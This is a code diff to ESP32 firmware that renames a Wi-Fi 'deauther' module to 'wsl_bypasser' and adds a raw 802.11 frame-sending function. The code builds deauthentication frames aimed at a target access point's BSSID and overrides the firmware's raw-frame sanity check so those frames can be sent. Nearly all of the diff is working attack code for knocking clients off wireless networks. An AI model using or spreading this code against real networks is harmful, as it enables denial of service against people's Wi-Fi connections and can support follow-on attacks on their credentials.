@@ -1,6 +1,6 @@
 // Inspired by: https://github.com/GANESH-ICMC/esp32-deauther
 
-#include "deauther.h"
+#include "wsl_bypasser.h"
 
 #include <stdint.h>
 #include <string.h>
@@ -11,7 +11,7 @@
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 
-static const char *TAG = "deauther";
+static const char *TAG = "wsl_bypasser";
 static const uint8_t deauth_frame_default[] = {
     0xc0, 0x00, 0x3a, 0x01,
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -24,12 +24,16 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
     return 0;
 }
 
-void deauther_send_deauth_frame(const wifi_ap_record_t *ap_record){
+void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
+    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+}
+
+void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
     ESP_LOGD(TAG, "Sending deauth frame...");
     uint8_t deauth_frame[sizeof(deauth_frame_default)];
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
     
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
+    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
